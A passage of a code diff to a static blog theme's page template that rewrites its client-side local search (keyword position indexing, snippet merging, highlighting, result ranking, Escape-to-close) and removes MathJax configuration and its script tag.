-                var data_title = data.title.trim().toLowerCase();
-                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
-                var data_url = decodeURIComponent(data.url);
-                var index_title = -1;
-                var index_content = -1;
-                var first_occur = -1;
-                // only match artiles with not empty titles and contents
-                if(data_title != '') {
-                  keywords.forEach(function(keyword, i) {
-                    index_title = data_title.indexOf(keyword);
-                    index_content = data_content.indexOf(keyword);
-                    if( index_title >= 0 || index_content >= 0 ){
-                      isMatch = true;
-                      if (i == 0) {
-                        first_occur = index_content;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
                       }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
                     }
 
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                   });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
                 }
+
                 // show search results
+
                 if (isMatch) {
-                  matchcounts += 1;
-                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
-                  var content = data.content.trim().replace(/<[^>]+>/g,"");
-                  if (first_occur >= 0) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
                     // cut out 100 characters
-                    var start = first_occur - 20;
-                    var end = first_occur + 80;
+                    var start = position - 20;
+                    var end = position + 80;
                     if(start < 0){
                       start = 0;
                     }
-                    if(start == 0){
-                      end = 50;
+                    if (end < position + word.length) {
+                      end = position + word.length;
                     }
                     if(end > content.length){
                       end = content.length;
                     }
-                    var match_content = content.substring(start, end);
-                    // highlight all keywords
-                    keywords.forEach(function(keyword){
-                      var regS = new RegExp(keyword, "gi");
-                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
-                    });
-
-                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                   }
-                  str += "</li>";
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
                 }
-              })};
-            str += "</ul>";
-            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
-            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
-            $resultContent.innerHTML = str;
-          });
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
           proceedsearch();
         }
-      });}
+      });
+    }
 
     // handle and trigger popup window;
     $('.popup-trigger').click(function(e) {
       e.stopPropagation();
-      if (isfetched == false) {
+      if (isfetched === false) {
         searchFunc(path, 'local-search-input', 'local-search-result');
       } else {
         proceedsearch();
       };
     });
 
-    $('.popup-btn-close').click(function(e){
-      $('.popup').hide();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    });
+    $('.popup-btn-close').click(onPopupClose);
     $('.popup').click(function(e){
       e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
     });
   </script>
 
 
-  
-  
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Config({
-        tex2jax: {
-          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-          processEscapes: true,
-          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-      });
-    </script>
 
-    <script type="text/x-mathjax-config">
-      MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-          all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-      });
-    </script>
-    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-  
 
 
   
@@ -964,6 +1249,12 @@
 
   
 
+  
+  
+
+  
+
+  
 
   
 
